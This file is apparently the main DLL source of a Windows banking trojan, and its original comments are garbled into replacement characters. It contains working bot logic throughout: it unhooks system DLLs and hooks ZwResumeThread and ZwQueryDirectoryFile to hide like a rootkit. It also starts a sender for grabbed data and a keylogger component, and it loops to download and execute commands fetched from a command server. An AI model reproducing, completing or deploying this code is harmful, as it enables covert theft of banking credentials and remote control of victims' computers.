// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"
#include "BotConfig.h"
#include "IfobsOnline.h"
#include "Task.h"
#include "Loader.h"


#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "Firefox.h"

#include "md5.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  ������� ���������� �����
//------------------------------------------------------------------------------

#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //��� ����������

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");


	UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// ������������ ���������� �������� �����
	InitializeTaskManager(NULL, true);

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}


	// ��������� ����� �������� ������
	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "�������� ���������� ������");
	while (true)
	{
		PCHAR URL = GetBotScriptURL(SCRIPT_TASK);

		// ��������� � ��������� �������
		if (URL != NULL)
		{
			DLLDBG("====>Bot Loader", "��������� ������� \r\n\URL: %s", URL);
			DownloadAndExecuteCommand(NULL, URL);
			STR::Free2(URL);
			DLLDBG("====>Bot Loader", "������ ������� ��������");
		}
		else
		{
			DLLDBG("====>Bot Loader", "�� ������� �������� ����� ������� ������");	
		}

		// "������������" �������������� ����������� ���� � ��� �������
		// �������� ��������� ���������� ������ ���� ������ ����� ���������
		// �������
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "���������� ���������� � �������");
			FirstSended = SendFirstInfo();
		}


		// ���������������� ���������� ������
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}



DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "��������� ���. ������� [%s]", GetPrefix());

	UnhookDlls();

	
	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();


	HookZwResumeThread();
	HookZwQueryDirectoryFile();

		
	DLLDBG("====>Bot DLL", "�������� Loader");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "�������� ������");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}


DWORD WINAPI StartThreadProc(LPVOID)
{
	InitializeAPI();          


	//while (1) pSleep(100000); 
	return 0;
}

extern"C"  void WINAPI Start()
{
	BOT::Initialize();
	string Msg;
	Msg.Format("1.11 ������������ ����� � �������� [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 

	pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
	
//	IfobsOnline::Initialize();

//	return;


	 
	Config::SetFileName("c:\\config\\config.bin"); 
	    
	RootkitThread(NULL); 

	while (1) pSleep(100000);    
}



